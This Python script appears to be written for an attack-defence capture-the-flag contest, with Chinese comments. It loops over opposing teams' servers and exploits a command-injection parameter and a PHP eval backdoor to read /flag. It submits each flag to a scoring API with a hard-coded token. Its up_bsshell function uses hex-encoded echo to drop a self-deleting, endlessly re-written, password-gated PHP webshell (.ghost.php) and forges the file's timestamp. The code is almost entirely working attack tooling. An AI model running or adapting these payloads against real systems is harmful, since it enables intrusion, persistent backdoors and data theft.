# coding=utf-8
import time
import re
import requests
import json
import os

############################################################
###################### READ ME FIREST ######################
############################################################
# 需要修改的内容：
# 1、main函数中的ip、port、method、payload配置
# 2、attack函数re.search内容
# 3、submit函数中提交格式格式
# 需要注意的事项：
# 1、attack中的remote或request必须设置timeout
# 2、接受flag前一定要把其他回显接收完
# 3、正式运行时将debug关闭，减少回显
#############################################################


def attack(ip, port, method, url_end, payload):  # 命令执行漏洞
    try:
        ################## 构造payload ################
        ################## post 方法 ##################
        # flag_data = {'pass': 'shang', 'a': "system('cat /flag');"}
        # r = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.ghost.php",
        #                   data=flag_data, timeout=10)
        ################## get 方法 ###################
        # r = requests.get("http://" + ip + ":" + port +
        #                  "/index.php?copyright=cat /flag")
        if method == 'get':
            r = requests.get("http://" + ip + ":" + port +
                             url_end + payload, timeout=10)
        elif method == 'post':
            r = requests.post("http://" + ip + ":" + port +
                              url_end, data=payload, timout=10)
        # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        # flag = re.search(r'flag\{.*\}', r.text).group()
        # 打印攻击结果
        print("[\033[0;36mFLAGS\033[0m] " + ip + ":" + port +
              "\033[0m Flag is : \033[0;36m" + flag + "\033[0m")
        return flag

    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port +
              "\033[0m Can not attack, because: \033[0;31m" + str(e) + "\033[0m")
        return False


def submit(ip, port, flag_text):  # 提交flag
    try:
        # 构造submit flag 参数
        submit_url = 'http://192.168.15.80:19999/api/flag'
        flag_header = {
            "Content-Type": "application/json;charset=utf-8",
            "Authorization": "1b1fae078083811a61e7794e8320755b",
        }
        # json格式化flag
        flag_data = json.dumps({"flag": flag_text})
        r = requests.post(submit_url, data=flag_data, headers=flag_header)
        submit_re = re.search(r'\"msg\"\:\".*\"', r.text).group()
        # 测试用代码段⬇⬇⬇⬇⬇⬇
        # submit_url = 'http://192.168.110.182:8888/flag_request.php'
        # flag_data = {'my_token': '2333333333333','flag':flag_text}
        # r = requests.post(submit_url, data=flag_data)
        # submit_re = re.search(r'attack.*success', r.text).group()
        # 测试用代码段⬆⬆⬆⬆⬆⬆
        ##########################

        if submit_re.find('success') != -1:
            print("[\033[0;32mSUCCE\033[0m] " +
                  ip + ":" + port + ' ' + submit_re)
        else:
            print("[\033[0;35mFAIL!\033[0m] " +
                  ip + ":" + port + ' ' + submit_re)
    except Exception as e:
        print(
            "[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port + "\033[0m Submit failed, because: \033[0;31m" + str(
                e) + "\033[0m")
        return False


def up_bsshell(ip, port, url_end, method, passwd):  # 批量上传不死马
    url = 'http://' + ip + ':' + port + url_end
    try:  # 判断漏洞页面是否存在
        if method == 'get':
            test_re = requests.get(url, timeout=3)
        elif method == 'post':
            test_re = requests.post(url, timeout=3)
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port +
              "\033[0m Can not connect, because: \033[0;31m" + str(e) + "\033[0m")
        return False
    if test_re.status_code != 200:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port +
              "\033[0m Page Not Found!>> \033[0;31m" + url + "\033[0m")
        return False
    else:
        # 执行命令 system 写入 .ghost.php
        # .ghost.php做hex转化
        bs_str = "system('echo 3c3f706870200a69676e6f72655f757365725f61626f72742874727565293b0a7365745f74696d655f6c696d69742830293b0a756e6c696e6b285f5f46494c455f5f293b0a2466696c65203d20272e2f2e67686f73742e706870273b0a24636f6465203d20273c3f706870206966286d643528245f504f53545b2270617373225d293d3d22383337396338363235306335306330353337393939613635373665313861613722297b406576616c28245f504f53545b615d293b7d203f3e273b0a7768696c65202831297b0a2020202066696c655f7075745f636f6e74656e7473282466696c652c24636f6465293b0a2020202073797374656d2827746f756368202d6d202d642022323032312d382d31312031323a34353a303022202e67686f73742e70687027293b0a2020202075736c6565702835303030293b0a7d200a3f3e|xxd -r -ps > .ghost.php');"}  # 参数[a]  进行写入不死马
        if method == 'get':
            data = {passwd: bs_str}
            try:
                res = requests.get(url, params=data, timeout=3)
            except:
                pass
        elif method == 'post':
            data = {passwd: bs_str}
            try:
                res = requests.post(url, data=data, timeout=3)
            except:
                pass
        # 检查 .ghost.php 是否存在。
        shell_url = os.path.dirname(url) + "/.ghost.php"
        res = requests.get(shell_url, timeout=3)
        if res.status_code != 200:
            print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + \
                  port + "\033[0m Shell build fail: \033[0;31m" + shell_url + "\033[0m")
            return False
        else:
            print("[\033[0;37;36mSUCCE\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + \
                  port + "\033[0m Shell build fail: \033[0;31m" + shell_url + "\033[0m")


def main():
    try:
        # 一轮中所有队伍
        for i in range(8801, 8887):
            self_id = 8802  # 跳过自己的队伍ip/端口
            if i == self_id:
                continue
            # 构造attack参数
            server_ip = "192.168.15.80"
            server_port = str(i)
            server_method = 'get'
            # server_method = 'post'
            server_url_end = '/index.php'
            server_payload = '?copyright=cat /flag'  # get方式
            # server_payload = {'pass': 'shang', 'a': "system('cat /flag');"} #post 方式
            # # 测试用代码段⬇⬇⬇⬇⬇⬇
            # server_ip = "192.168.110.182"
            # server_port = str(i)
            # server_method = 'get'
            # # server_method = 'post'
            # server_url_end = '/task_request.php'
            # # server_payload = {'task_content': '123456', 'task_id': "2333333"} #post 方式
            # server_payload = 'test'
            # #测试用代码段⬆⬆⬆⬆⬆⬆
            # 开始攻击
            flag_text = attack(server_ip, server_port,
                               server_method, server_url_end, server_payload)
            # 获取flag成功后
            if flag_text != False:
                submit(server_ip, str(i), flag_text)
            time.sleep(1)
        print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
              time.localtime()) + " Round attack end, waitting for next round.")
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mMain function error, because: " + str(e) + "\033[0m")
        exit(0)


if __name__ == '__main__':
    try:
        while 1:
            # 每个轮次
            print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
                                                                 time.localtime()) + " Begin to attack")
            main()
            time.sleep(2 * 6)
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mMain function error, because: " + str(e) + "\033[0m")
        exit(0)
